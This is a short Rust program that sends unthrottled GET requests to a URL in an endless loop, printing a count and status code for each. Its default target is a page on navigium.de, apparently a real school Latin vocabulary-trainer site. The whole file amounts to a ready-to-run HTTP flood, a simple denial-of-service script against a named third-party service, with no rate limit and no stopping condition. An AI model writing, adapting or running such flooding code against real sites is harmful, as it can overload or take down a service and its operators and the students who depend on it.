use std::env;

#[tokio::main]
async fn main() {
    let site = env::args().nth(1).unwrap_or("https://www.navigium.de/schule/vokabeltrainer/sprint/-954936,954936/SUBST,ADJ,PRON,VERB,ADV,KONJ,SUBJ,PRAEP,PHR,EIGN,ETC/BEDEUTUNGEN/lang/LA".to_string());
    let client = reqwest::Client::new();
    let mut request_count = 0;

    loop {
        let response = client.get(&site).send().await;
        match response {
            Ok(response) => {
                println!(
                    "Request {} => Success => Status code: {}",
                    request_count,
                    response.status()
                );
            }
            Err(error) => {
                println!("Request {} => Failed => {}", request_count, error);
            }
        }
        request_count += 1;
    }
}
